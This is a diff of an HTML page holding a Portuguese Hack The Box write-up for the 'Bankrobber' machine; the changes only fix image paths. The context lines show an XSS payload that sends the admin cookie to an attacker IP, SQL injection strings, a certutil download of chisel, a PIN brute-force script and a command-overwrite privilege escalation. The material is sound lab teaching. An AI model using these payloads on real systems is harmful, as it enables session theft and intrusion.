@@ -158,8 +158,8 @@
 <h1 id="enumeração"><a class="header" href="#enumeração">Enumeração</a></h1>
 <h2 id="nmap"><a class="header" href="#nmap">Nmap</a></h2>
 <p>Assim como em todas as máquinas, a fase inicial é a fase de enumeração. E nesta fase, enumeramos sempre em primeiro lugar as portas activas da máquina... São os pontos de entrada, por isso temos obrigação de saber todos os pontos de entrada para só depois ver que tipo de falhas poderá haver.</p>
-<p><img src="Assets%5CHTB-Windows-Insane-Bankrobber%5CallPorts.png" alt="nmap allPorts" /></p>
-<p><img src="Assets%5CHTB-Windows-Insane-Bankrobber%5Cnmap-A.png" alt="nmap nmap-A" /></p>
+<p><img src="Assets/HTB-Windows-Insane-Bankrobber/allPorts.png" alt="nmap allPorts" /></p>
+<p><img src="Assets/HTB-Windows-Insane-Bankrobber/nmap-A.png" alt="nmap nmap-A" /></p>
 <p>A primeira vista, nada de extraordinário. Mas mesmo assim á pontos importantes a realçar.</p>
 <ul>
 <li>Existe um servidor http</li>
@@ -168,20 +168,20 @@
 <li>Existe um servidor mysql-MariaDB (A partir dai sempre será necessário testar SQLi pelo site a fora)</li>
 </ul>
 <h2 id="website"><a class="header" href="#website">WebSite</a></h2>
-<p><img src="Assets%5CHTB-Windows-Insane-Bankrobber%5CPagina_Inicial_Login-E-coin.png" alt="Página inicial" /></p>
+<p><img src="Assets/HTB-Windows-Insane-Bankrobber/Pagina_Inicial_Login-E-coin.png" alt="Página inicial" /></p>
 <p>Esta página é muito em chuto. Não tem grande coisa, o que é bom para focar nos problemas, e não andar a procura de agulhas. Existe uma secção de login e outra de registo.</p>
 <p>A primeira coisa a tentar sempre é logins por defeito... admin:admin, admin:password... Nada funciona, nem se vê mensagens de erro que nos ajude a enumerar usuários ou outras coisas (E ainda bem lol). SQLi ai também não funciona, pelo menos as coisas básicas.</p>
 <p>Agora o proximo passo é criar um usuário e vasculhar o Site.</p>
 <p>Tentei criar o usuário admin, e aí apareceu um erro:</p>
-<p><img src="Assets%5CHTB-Windows-Insane-Bankrobber%5Cregistering_admin.png" alt="Registering admin" /></p>
+<p><img src="Assets/HTB-Windows-Insane-Bankrobber/registering_admin.png" alt="Registering admin" /></p>
 <p>Bom, aí já não está bom... esta mensagem de erro ajuda-nos a enumerar possíveis usuários. Parece que o usuário &quot;admin&quot; existe...</p>
 <p>Criei então o usuário javali:javali</p>
-<p><img src="Assets%5CHTB-Windows-Insane-Bankrobber%5Cjavali_created.png" alt="Registering javali" /></p>
+<p><img src="Assets/HTB-Windows-Insane-Bankrobber/javali_created.png" alt="Registering javali" /></p>
 <p>E com esse novo usuário, foi possível fazer o login.</p>
-<p><img src="Assets%5CHTB-Windows-Insane-Bankrobber%5Clogged_as_javali.png" alt="Logged as javali" /></p>
+<p><img src="Assets/HTB-Windows-Insane-Bankrobber/logged_as_javali.png" alt="Logged as javali" /></p>
 <p>Outra página muito em chuto, o que nos ajuda a saber por que caminho andar... os 2 primeiros campos estão limitados para se poder introduzir apenas números. Alterando isso, logo do navegador ou por burpsuite nada muda. O alvo é mesmo o campo de comentário.</p>
 <p>Cada vez que se carregue em &quot;transfere coin&quot;, aparece um alerta que nos diz que a nossa petição irá se avaliado por um administrador...</p>
-<p><img src="Assets%5CHTB-Windows-Insane-Bankrobber%5Cadmin_review.png" alt="Admin Review" /></p>
+<p><img src="Assets/HTB-Windows-Insane-Bankrobber/admin_review.png" alt="Admin Review" /></p>
 <p>Já que, aparentemente, esta máquina está a dizer que um administrator irá abrir a transação dentro de instantes, poderá significar ques existe alguma tarefa automática que simula um administrador a abrir a nossa mensagem. Vamos primeiro tratar de identificar se existe uma falha conhecida como XSS (Cross-site scripting), introduzindo no campo de comentário o seguinte código:</p>
 <pre><code class="language-html">&lt;script src=&quot;http://10.10.14.9/test.js&quot;&gt;&lt;/script&gt;
 </code></pre>
@@ -198,27 +198,27 @@
 request.open('GET', 'http://10.10.14.9/test.js?cookie=' + document.cookie, true)
 request.send()
 </code></pre>
-<p><img src="Assets%5CHTB-Windows-Insane-Bankrobber%5Ccookie_hijack.png" alt="Cookie hijack" /></p>
+<p><img src="Assets/HTB-Windows-Insane-Bankrobber/cookie_hijack.png" alt="Cookie hijack" /></p>
 <p>Na imagem, é possível ver o cookie de um usuário (supostamente administrador pelo que o alerta nos informou). Esse cookie está &quot;encoded&quot;. Primeiro podemos reverter o &quot;urlencoded&quot; com ajuda do php em modo interativo. O resultado é o seguinte:</p>
 <pre><code class="language-bash">username=YWRtaW4=; password=SG9wZWxlc3Nyb21hbnRpYw==; id=1
 </code></pre>
 <p>Isto não é o username e password em texto claro. Mas pelo formato, é facilmente identificável. Vamos tentar descodificar:</p>
-<p><img src="Assets%5CHTB-Windows-Insane-Bankrobber%5Cadmin_credenciais.png" alt="Credenciais do administrador" /></p>
+<p><img src="Assets/HTB-Windows-Insane-Bankrobber/admin_credenciais.png" alt="Credenciais do administrador" /></p>
 <p>Com essas credenciais, podemos efetuar logout, e login com as credenciais do usuário &quot;admin&quot;</p>
-<p><img src="Assets%5CHTB-Windows-Insane-Bankrobber%5Cadmin_page.png" alt="Admin page" /></p>
+<p><img src="Assets/HTB-Windows-Insane-Bankrobber/admin_page.png" alt="Admin page" /></p>
 <p>Esta página está também bastante cru, e já dá para planear coisas.</p>
 <p>Existem dois campos, 1 que diz ID, e outro que diz Command onde no seu comentário diz que podemos rodar um dir com quaisquer argumentos... Isto já cheira a frito...</p>
 <h2 id="sqli"><a class="header" href="#sqli">SQLi</a></h2>
 <p>Vamos abordar por enquanto apenas o campo ID.</p>
 <p>Se pusermos um número, podemos ver usuários:</p>
-<p><img src="Assets%5CHTB-Windows-Insane-Bankrobber%5Csearch_user_sqli.png" alt="Search User" /></p>
+<p><img src="Assets/HTB-Windows-Insane-Bankrobber/search_user_sqli.png" alt="Search User" /></p>
 <p>Com já sabemos que existe provavelmente uma base de dados em mysql (NMAP em força), vamos tentar coisas sombrias!</p>
-<p><img src="Assets%5CHTB-Windows-Insane-Bankrobber%5Csearch_user_sqli_error.png" alt="Search User SQLi error" /></p>
+<p><img src="Assets/HTB-Windows-Insane-Bankrobber/search_user_sqli_error.png" alt="Search User SQLi error" /></p>
 <p>HUUUH xD A aspa simples fatal para a aplicação lol. Isto significa que é vulnerável a SQL Injection.</p>
 <p>Agora a simples injeção básica do &quot;or 1=1-- -&quot;</p>
 <pre><code class="language-sql">1' or 1=1-- -
 </code></pre>
-<p><img src="Assets%5CHTB-Windows-Insane-Bankrobber%5Csearch_user_enumeration_users.png" alt="Search User SQLi user enumeration" /></p>
+<p><img src="Assets/HTB-Windows-Insane-Bankrobber/search_user_enumeration_users.png" alt="Search User SQLi user enumeration" /></p>
 <p>Ok. Ai estão todos os usuários. E ainda temos sorte, o php/html está feito para criar linhas para incluir todos os resultado. Não é necessário concatenar nem coisa parecida.</p>
 <p>Poderia fazer um script em python para simular uma shell, mas como já fiz na máquina <strong><em>FALAFEL</em></strong>, vou direto ao assunto. Além disso, para esta máquina, já há alguns scripts e vai haver mais um ainda.</p>
 <p>O Próximo passo é enumerar a base de dados:</p>
@@ -228,20 +228,20 @@ request.send()
 3' order by 4-- -    # Ther is a problem with your SQL syntax
 3' order by 3-- -    # 3 javali
 </code></pre>
-<p><img src="Assets%5CHTB-Windows-Insane-Bankrobber%5Csqli_order_by_3.png" alt="SQLi order by 3" /></p>
+<p><img src="Assets/HTB-Windows-Insane-Bankrobber/sqli_order_by_3.png" alt="SQLi order by 3" /></p>
 <p>Perceber quais as colunas cujo resultado aparecem na tela:</p>
 <pre><code class="language-sql">3' union select 111,222,333-- -
 </code></pre>
-<p><img src="Assets%5CHTB-Windows-Insane-Bankrobber%5Cunion_select_111,222,333.png" alt="Union Select 111,222,333" /></p>
+<p><img src="Assets/HTB-Windows-Insane-Bankrobber/union_select_111,222,333.png" alt="Union Select 111,222,333" /></p>
 <p>Daí para a frente, podemos injectar código para que apareca resultado no 1º ou 2º campo (111,222).</p>
 <p>Não me vou atardar mais com SQLi, posso dizer que na base de dados não se vai aprender grande coisa. Mas o mysql tem a possibilidade de ler arquivos do sistema, e esta função não está bloqueada. Vamos tentar ler um ficheiro que temos a certeza que irá existir para testar:</p>
-<p><img src="Assets%5CHTB-Windows-Insane-Bankrobber%5Cread_hosts.png" alt="etc/hosts" /></p>
+<p><img src="Assets/HTB-Windows-Insane-Bankrobber/read_hosts.png" alt="etc/hosts" /></p>
 <p>Isto aqui não é nada comodo... Não quiz fazer um script em python, mas ainda há uma outra forma de ver isso de uma forma mais simples. Através de um curl. Com o google chrome, é possível copiar uma petição em formato Curl:</p>
-<p><img src="Assets%5CHTB-Windows-Insane-Bankrobber%5CcopyAsCurl.png" alt="Copy as Curl" /></p>
+<p><img src="Assets/HTB-Windows-Insane-Bankrobber/copyAsCurl.png" alt="Copy as Curl" /></p>
 <p>Voltaremos mais tarde a este assunto, porque ainda faltam dados acerca deste puzzle!</p>
 <h2 id="notetxt"><a class="header" href="#notetxt">note.txt</a></h2>
 <p>Na página de administrador existe uma hiperligação para um note.txt</p>
-<p><img src="Assets%5CHTB-Windows-Insane-Bankrobber%5Cnote.txt.png" alt="note.txt" /></p>
+<p><img src="Assets/HTB-Windows-Insane-Bankrobber/note.txt.png" alt="note.txt" /></p>
 <p>Nessas notas podemos ver que o servidor Web é feito com Xampp, e fala novamente no localhost...</p>
 <h2 id="sqli-into-rce"><a class="header" href="#sqli-into-rce">SQLi into RCE</a></h2>
 <p>Neste ponto temos de fazer um break e expor as informações que temos:</p>
@@ -265,12 +265,12 @@ request.send()
 </li>
 <li>Se tentarmos enviar um dir, podemos ver o request, ou através de burpsuite, ou logo pelo navegador:</li>
 </ul>
-<p><img src="Assets%5CHTB-Windows-Insane-Bankrobber%5Cdir_backdoorchecker.png" alt="dir backdoorchecker.php" /></p>
+<p><img src="Assets/HTB-Windows-Insane-Bankrobber/dir_backdoorchecker.png" alt="dir backdoorchecker.php" /></p>
 <p>Agora sim temos um pouco de tudo. O ficheiro que nos interessa ver para ver que tipo de filtros existe é o backdoorchecker.php. Que por sua vez se encontra provavelmente em C:\xampp\htdocs\admin\backdoorchecker.php por ser a path de instalação padrão (C:\xampp\htdocs) e o resto vê-se na Request URL da própria petição que fizemos</p>
 <h3 id="visualização-do-ficheiro-backdoorcheckerphp"><a class="header" href="#visualização-do-ficheiro-backdoorcheckerphp">Visualização do ficheiro backdoorchecker.php</a></h3>
 <p>Este ficheiro é um php o que pode trazer alguns problemas, pois ao ser transferido pode ser interpretado antes de nós podemos visualizar o código fonte. Então para se ver tudo, existe em SQL uma função para converter uma string em base64. A petição foi feita em curl para não ficar tudo deformado, e depois é só descodificá-lo:</p>
-<p><img src="Assets%5CHTB-Windows-Insane-Bankrobber%5Ccurl_base64_backdoorchecker.png" alt="Curl backdoorchecker.php encoded" /></p>
-<p><img src="Assets%5CHTB-Windows-Insane-Bankrobber%5Ccurl_base64_backdoorchecker_base64-d.png" alt="backdoorchecker.php decoded" /></p>
+<p><img src="Assets/HTB-Windows-Insane-Bankrobber/curl_base64_backdoorchecker.png" alt="Curl backdoorchecker.php encoded" /></p>
+<p><img src="Assets/HTB-Windows-Insane-Bankrobber/curl_base64_backdoorchecker_base64-d.png" alt="backdoorchecker.php decoded" /></p>
 <p>Vemos que não podemos utilizar o segunte conjunto:</p>
 <blockquote>
 <p>$bad = array('$(','&amp;')</p>
@@ -294,17 +294,17 @@ request.send(params)
 <ul>
 <li>Obrigar o user &quot;admin&quot; simulado a executar esse javascript:</li>
 </ul>
-<p><img src="Assets%5CHTB-Windows-Insane-Bankrobber%5Crce.png" alt="rce.js" /></p>
-<p><img src="Assets%5CHTB-Windows-Insane-Bankrobber%5Cin-the-target-machine.png" alt="In the target machine" /></p>
+<p><img src="Assets/HTB-Windows-Insane-Bankrobber/rce.png" alt="rce.js" /></p>
+<p><img src="Assets/HTB-Windows-Insane-Bankrobber/in-the-target-machine.png" alt="In the target machine" /></p>
 <h1 id="privesc"><a class="header" href="#privesc">PrivEsc</a></h1>
 <p>Depois de um café, vamos enumerar um pouco a máquina. </p>
 <pre><code class="language-powershell">netstat -ano
 </code></pre>
-<p><img src="Assets%5CHTB-Windows-Insane-Bankrobber%5Cnewport.png" alt="Porta nova" /></p>
+<p><img src="Assets/HTB-Windows-Insane-Bankrobber/newport.png" alt="Porta nova" /></p>
 <p>Existe uma porta nova, que não existia no NMAP, por estar bloqueado a nível de firewall para se poder operar apenas por localhost. Porta 910!</p>
 <pre><code class="language-powershell">tasklist
 </code></pre>
-<p><img src="Assets%5CHTB-Windows-Insane-Bankrobber%5Ctasklist.png" alt="tasklist" /></p>
+<p><img src="Assets/HTB-Windows-Insane-Bankrobber/tasklist.png" alt="tasklist" /></p>
 <p>Através do PID, verificamos que o programa que está a ocupar esta porta é o bankv2.exe.</p>
 <p>poderiamos tratar de fazer o download do programa para verificar o que faz e tratar de encontrar um possível BufferOverFlow, mas em primeiro lugar, quero saber o que está a fazer neste momento...</p>
 <p>Para ser mais comodo, vou fazer um PortForwarding desta porta 910 para a minha porta 910 da minha máquiina kali.</p>
@@ -325,10 +325,10 @@ chisel.elf server --reverse -p 8008
 certutil -urlcache -f http://10.10.14.19/chisel.exe
 chisel.exe client 10.10.14.9:8008 R:910:127.0.0.1:910
 </code></pre>
-<p><img src="Assets%5CHTB-Windows-Insane-Bankrobber%5Cserver_chisel.png" alt="Server chisel" /></p>
+<p><img src="Assets/HTB-Windows-Insane-Bankrobber/server_chisel.png" alt="Server chisel" /></p>
 <p>A partir de agora, a porta 910 da minha máquina local kali é igual á da máquina alvo.</p>
 <p>Se usarmos um simples nc, dá para ver o que se lá passa:</p>
-<p><img src="Assets%5CHTB-Windows-Insane-Bankrobber%5Clocal910.png" alt="Local 910" /></p>
+<p><img src="Assets/HTB-Windows-Insane-Bankrobber/local910.png" alt="Local 910" /></p>
 <p>Está protegido por um PIN. Como está na nossa máquina, e sempre que tento um PIN, o programa apenas se fecha e está pronto para outra, vou fazer brute force nele!!</p>
 <pre><code class="language-python">import socket
 import sys
@@ -369,13 +369,13 @@ def main():
 main()
 </code></pre>
 <p>Com esse simples script, vou testando todos os PINs até que me reporta qual é:</p>
-<p><img src="Assets%5CHTB-Windows-Insane-Bankrobber%5Cpin.png" alt="PIN" /></p>
+<p><img src="Assets/HTB-Windows-Insane-Bankrobber/pin.png" alt="PIN" /></p>
 <p>A partir daí, deu para perceber que, em vez de colocar um valor de transferência, se puser montes de caracteres, estou a reescrever a parte que dizia &quot;[$] Executing e-coin transfer tool: C:\Users\admin\Documents\transfer.exe&quot;. E visto que este caminho é de &quot;admin&quot;, pode-se assumir que essa ferramenta será executada com privilégios de administrador... Não esquecer de preparar o nc em modo de escuta.</p>
-<p><img src="Assets%5CHTB-Windows-Insane-Bankrobber%5CbufferOverflow.png" alt="BufferOverFlow" /></p>
+<p><img src="Assets/HTB-Windows-Insane-Bankrobber/bufferOverflow.png" alt="BufferOverFlow" /></p>
 <p>Dá para tentar reescrever o commando que é suposto aparecer ali, para ver o que acontece. Depois de perceber quantos caracteres são precisos para reescrever o comando (32 caracteres), é só concatenar a essas 32 caracteres, um comando nosso:</p>
-<p><img src="Assets%5CHTB-Windows-Insane-Bankrobber%5Cadmin_pwned.png" alt="Admin RCE" /></p>
+<p><img src="Assets/HTB-Windows-Insane-Bankrobber/admin_pwned.png" alt="Admin RCE" /></p>
 <p>Isto não é bem um BufferOverFlow, mas a base é a mesma. Reescrever uma instrução. </p>
-<p><img src="Assets%5CHTB-Windows-Insane-Bankrobber%5Cadmin_whoami_authority-system.png" alt="Admin whoami" /></p>
+<p><img src="Assets/HTB-Windows-Insane-Bankrobber/admin_whoami_authority-system.png" alt="Admin whoami" /></p>
 <p>As flags estão sempre no mesmo sítio...</p>
 <pre><code class="language-powershell">type C:\Users\Cortin\Desktop\user.txt
 #&gt;  f635346600876a43441cf1..........
